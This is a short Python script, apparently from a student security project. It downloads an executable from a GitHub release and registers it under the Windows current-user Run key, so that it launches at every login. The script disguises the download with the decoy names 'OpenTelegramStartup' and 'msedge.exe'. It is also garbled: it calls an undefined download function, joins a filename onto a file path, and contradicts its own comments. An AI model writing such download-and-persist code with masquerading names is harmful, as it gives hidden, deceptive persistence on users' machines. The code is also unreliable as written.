import winreg
import os
import sys

# Name of the value inside the Registry (can be anything you want)
download_file(
    url="https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/main.exe", 
    destination_path="C:\\Temp\\monoukfile.exe"
)
REG_NAME = "OpenTelegramStartup"

# Determine the directory where this script/exe is running
# if getattr(sys, 'frozen', False):
#     SCRIPT_DIR = os.path.dirname(sys.executable)
# else:
#     SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__)) 
# use r to ingore backslashes in the path, and set it to the directory of msedge.exe for demonstration
SCRIPT_DIR = r"C:\\Temp\\monoukfile.exe"

# Path to the target file
TARGET_FILE = "msedge.exe"

# Correctly joins them to: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
TARGET_PATH = os.path.join(SCRIPT_DIR, TARGET_FILE)

def add_to_registry_startup():
    # Enforce quotes around the path in case the file path contains spaces
    formatted_path = f'"{TARGET_PATH}"'
    
    # Path to the Run registry key
    registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Check if the target batch file actually exists before editing registry
    if not os.path.isfile(TARGET_PATH):
        print(f"[-] Error: Could not find '{TARGET_FILE}' at {TARGET_PATH}")
        print("    Please make sure the file exists next to this script.")
        return

    try:
        # Open the key for the current user with write/set permissions
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        
        # Create or update the String Value (REG_SZ)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, formatted_path)
        winreg.CloseKey(key)
        
        print(f"[+] Success: Added to Registry startup!")
        print(f"    Key Name: {REG_NAME}")
        print(f"    Target Path: {formatted_path}")
        
    except Exception as e:
        print(f"[-] Failed to write to registry: {e}")

if __name__ == "__main__":
    add_to_registry_startup()
